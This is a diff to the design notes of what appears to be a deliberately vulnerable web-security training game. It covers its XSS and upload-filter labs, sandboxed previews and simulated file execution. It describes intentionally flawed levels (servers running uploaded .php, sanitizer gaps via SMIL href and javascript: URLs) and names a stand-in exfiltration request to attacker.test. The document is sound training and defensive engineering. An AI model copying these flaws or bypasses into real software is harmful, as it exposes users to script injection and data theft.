@@ -181,6 +181,7 @@ case (g)). Divine resists every exploit.
 | `newMarker()`, `xssBrowser(world, handler, { marker, canary, interact?, dom? })`, `XSS_STEAL_URL` | `core/xss` (`core/victim.ts`) | XSS labs: the player's marker call per player and level, and the admin's browser whose rendered pages run through the oracle; a payload that runs sends `GET http://attacker.test/steal?c=<canary>` to the attacker log (section 13) |
 | `previewFrame(fragment, { marker?, title?, hash? })` | `core/xss` | the vulnerable fragment, live for the player, inside `<iframe sandbox="allow-scripts" srcdoc>`; the only raw output of an XSS view (section 13) |
 | `xssOracle(html, marker, opts?)`, `linkSinks(html)`, `roundTrip(html)`, `XSS_LIMITS` | `core/xss` | the static oracle itself (sinks, marker, mXSS), the links and resources a mail would load, a sanitizer's fixed-point seam, the bounds (section 13) |
+| `rendersDocument(headers)`, `DOCUMENT_MIME_TYPES` | `core/xss` (`core/victim.ts`, `core/xss/rules.ts`) | whether a browser renders an answer with these headers as an HTML or XML document, or not at all (another type, an attachment): the rule `xssBrowser` judges by, for a lab page that tells the player how the victim reads an answer (SC-05) |
 | `setLabHeaders(res, { csp?, frameAncestors?, xfo?, cors? })`, `labHeaders(h)`, `LabHeaders` | `core/http` | a level's CSP / `X-Frame-Options` / `frame-ancestors` / CORS on its OWN route's response, from an allow-list; `labHeaders` is the same lines as a plain object, for a citadel twin's `SimResponse` (section 4, "Lab headers") |
 
 `req.level` on a challenge route is already clamped to the implemented levels;
@@ -1263,7 +1264,8 @@ const labs = perSession((): LabState => {
 - **Memory.** A full instance is about 315 KiB at worst (measured with a full GC; about 270 KiB with short ASCII names).
   `simFs` caps its holder like a victim world: at most `SIM_LIMITS.newWorldsPerMinute` (30) new instances a minute,
   and each instance weighs `SIMFS_LIMITS.weight` (352 KiB) in the 96 MiB byte budget shared with every victim world
-  (section 8). A lab state with both a world and a file system (SC-05, SC-09) weighs both, about 1.6 MiB. Eviction
+  (section 8). A lab state weighs every store it holds: SC-05's (a world, the moderator's XSS browser and a file
+  system) about 1.9 MiB, SC-09's (a scroll desk: a file system only) 352 KiB. Eviction
   from that budget is a reset, so keep no limiter in this state. Upload labs have no limiter, so they may offer
   Restart (`reset: (req) => labs.reset(req)`).
 
@@ -1308,6 +1310,14 @@ browser lays out (and may try to decode) at that size, so give the `<img>` a fix
 `<img src="..." alt="" style="width: 8rem; height: 8rem; object-fit: contain">`, never its intrinsic size. SVG is not
 a raster: `looksLikeImage(svg)` is false.
 
+SC-09 (`scriptorium/sc-09-polyglot-image/`) is the worked example, on the scroll desk with `preview: true`: Acolyte
+accepts what the upload's Content-Type claims, Inquisitor what `looksLikeImage` accepts (both keep the uploader's name
+and bytes, and the server runs a stored `.php`), and Divine stores `placeholderImage(sniffImage(bytes))` under a
+server-made `.gif` name and runs nothing. It takes the `<?hvwa CANARY ?>`-tail path only: no level serves player
+markup, so it needs no XSS victim, and its spec uses the oracle to show that no level's page renders an upload. Its
+spec pins Divine's stored file to the exact placeholder bytes (a Divine that kept the player's bytes under a safe name
+would pass every exploit case), and unit-tests Divine's "never runs" on a planted `.php` that no upload can produce.
+
 ### "Execution": `simInterpret(bytes, canary)`, and why nothing runs
 
 Whether a stored file "runs" is **the level's decision**: its flawed name or type mapping (`.php` anywhere, the first
@@ -1331,7 +1341,32 @@ active type**, whatever was claimed or sniffed. A route that hands a stored file
 application/octet-stream`, `X-Content-Type-Options: nosniff`, `Content-Disposition: attachment` and
 `Content-Security-Policy: sandbox`. What the simulated server would have sent (its content type, whether the file
 ran, what it printed) goes on a lab page as escaped text. An SVG or HTML payload that must be seen firing (SC-05)
-goes only through E0's sandboxed preview frame.
+goes only through E0's sandboxed preview frame. The one other way out is the scroll desk's **raster preview** (below):
+a file whose bytes start like a PNG, JPEG, GIF or WebP, sent as the type that header names (never the claim), with
+`nosniff` and a CSP `sandbox`, and drawn in a fixed CSS box. A raster image of its own type never runs script.
+
+### The Scroll Desk (`scriptorium/_shared/desk.ts`: SC-07, SC-08, SC-09)
+
+A shell for the upload-filter labs: the uploader page, `POST /` (the upload), `GET /uploads?name=` (the simulated
+archive server: the inert download, or the interpreter's output when the level says the file runs) and, opt-in,
+`GET /preview?name=`. Every decision is a `DeskLevel` callback in the lab's `levels/*.ts`: `store(fs, file)` (refuse,
+or write and say where) and `serve(fs, name)` (find the file, and whether it runs). `mountDesk(router, options)`:
+
+- `newDesk({ seed?, separators? })` in the `perSession` factory: a `simFs` with one pinned seed under `/srv/uploads`
+  (default `README.txt`, "Scrolls go here."; SC-09 seeds a server-made sample image) and the simulated OS's separators.
+- `partial` (an absolute `.ejs` path) and `extra(req, res)`: the lab's own content, drawn under the message. The
+  partial sees the desk's view data plus `extra` (one key, so it never collides with the desk's or the engine's keys)
+  and escapes its own values. Display only: no filter or decision lives there.
+- `statementNote` (default true): the note on `<?hvwa CANARY ?>`. A desk whose server runs files keeps it.
+- `preview` (default false): `GET /preview?name=` looks the file up with the level's `serve` (never running it) and
+  serves only a raster, as the type its header names, `nosniff` and `Content-Security-Policy: sandbox`; anything else
+  is a plain-text 404. **At Divine it sends `placeholderImage(sniff)`**, never a stored byte, so the secure reference
+  never shows the player's bytes even if a level kept them. The page draws each raster file as
+  `<img class="desk-preview" ... width="128" height="128" style="width: 8rem; height: 8rem; object-fit: contain">`.
+- The test kit `describeDeskBasics({ challenge, path, heading, labFor, seed?, accepted?, preview? })`: `seed` is the
+  lab's seed (name and body), `accepted` the content type and body prefix the lab's Acolyte and Divine store (an image
+  lab claims an image type and starts with an image header), `preview` whether the route exists. The options' own cases
+  are in `tests/desk-shell.spec.ts` (fixture lab DK-01).
 
 ### Testing
 
@@ -1709,6 +1744,33 @@ has no `<summary>`).
   applies; other CSP directives are not evaluated. Per the SC-05
   amendment, the citadel serves the sigil inline inside an HTML page, the real route always sends an inert download,
   and the payload fires only in the preview.
+- **SC-05, the worked example of served markup** (`scriptorium/sc-05-svg-xss/`). Each level exports `accept(svg)`
+  (its upload filter: refuse, or the text to store) and `review(sigil)`: the gallery's WHOLE answer to the moderator's
+  `GET /review`, every header and the body, which the citadel handler returns as a raw `SimResponse` (a `Reply`
+  carries no Content-Type or Content-Disposition). Acolyte and Templar answer an HTML page with the sigil inline,
+  Inquisitor the file itself as `image/svg+xml` (read as XML), Divine an HTML page with the source escaped in a `<pre>`
+  and a download link. No level puts a CSP on the review page: a `sandbox` there would hide a Divine that inlines (the
+  oracle would see nothing run), and other directives are not evaluated anyway. One sigil per player (an upload
+  replaces it), at most 12 KiB (`receive(req, 'sigil', { maxFileBytes: 12 * 1024 })`), so every review page stays under
+  the oracle's 16 KiB and is judged whole (the spec checks the largest sigil at every level). The victim is a custom
+  action (follow `/review`, after re-arming the moderator's session) that returns a note when the payload did not run:
+  the verdict's `wellFormed: false`, `limited`, or `reachedMarker` with nothing run. The preview frame shows the
+  review's body whenever the moderator's browser renders it. **At Inquisitor that body is XML, but the preview draws it
+  inside an HTML page**, which forgives what an XML reader refuses (a missing `xmlns`, an unclosed tag): the page says
+  so, and the note tells the player why the moderator's browser ran nothing; which reading applies comes from the
+  engine's own rule (`rendersDocument(review.headers)`), never a lab copy of it. The real `GET /sigil` (and the
+  citadel's) is the inert download at every level: its CSP `sandbox` through `setLabHeaders` (`labHeaders` in the twin),
+  its type, `nosniff` and `attachment` (outside that allow-list) through `res.set`. Inquisitor and Divine refuse any
+  `<!DOCTYPE` (a superset of "an internal subset": a quoted `>` in the external id cannot slip a subset past it).
+  **A sanitizer written as text rules must know where tags are** (review M1): Inquisitor's first stripper ran over the
+  whole text, so a quote opened in text, a comment or CDATA swallowed a later start tag as an attribute value and kept
+  its handler. It now reads comments, CDATA and processing instructions past whole, strips inside each start tag only
+  (any XML name starts one, not only ASCII letters), drops `srcdoc`, and drops a `javascript:` URL from `href`, `src`,
+  `action` and `formaction` under any prefix once character references are undone and tabs and newlines removed, so
+  only SVG's own gap is left: SMIL events and a SMIL `href` animation. **Preview fidelity:** every SVG link solve
+  fires in the preview when clicked (Chrome 157, on the level-built preview): `href`, `xlink:href` with or without an
+  `xmlns:xlink` declaration, and an `href` set by SMIL `animate` or `set` (the shim reads an SVG anchor's effective
+  `href`, below).
 - **HTML mail (FP-12).** Mail clients run no script. `linkSinks(html)` lists every link and resource URL in document
   order (`a`, `area`, `form`, `img`/`srcset`, CSS `url()`/`@import` ...), parsed with scripting off as a mail client
   parses. Build the mail's `links` from it, and classify each URL with `classifySimUrl`. It reports `link` with
@@ -1771,7 +1833,11 @@ Every string kept is a copy.
 - **`javascript:` links run in the preview through the shim.** A `sandbox="allow-scripts"` frame never runs a
   `javascript:` URL a click navigates to (Chrome 157, with or without the meta CSP), so a link payload the oracle
   counts would never be seen firing. The shim catches the click on an `a` or `area`, or on a submit button with a form
-  owner (its `formaction`, else the form's `action`), decodes the URL exactly as the oracle does (`urlText`,
+  owner (its `formaction`, else the form's `action`), and reads the link's EFFECTIVE URL: an HTML `a` or `area` its
+  `href` attribute, an SVG `a` its `href.animVal` (the `href` attribute, else `xlink:href` whether its namespace was
+  declared or not, or while a SMIL `animate` or `set` of `href` runs, the value it set). An anchor that is no link (no `href`, or an
+  SVG anchor whose effective `href` is empty) lets the click go on to the nearest link or button around it. The shim
+  decodes the URL exactly as the oracle does (`urlText`,
   `schemeOf`, `javascriptSource`: C0 controls and spaces trimmed, tabs and newlines removed, the scheme compared
   case-insensitively, the rest percent-decoded as UTF-8; entities are undone by the parser), cancels the navigation and
   runs the code as an inline script in the frame. The frame stays sandboxed with no `allow-same-origin`; a page CSP
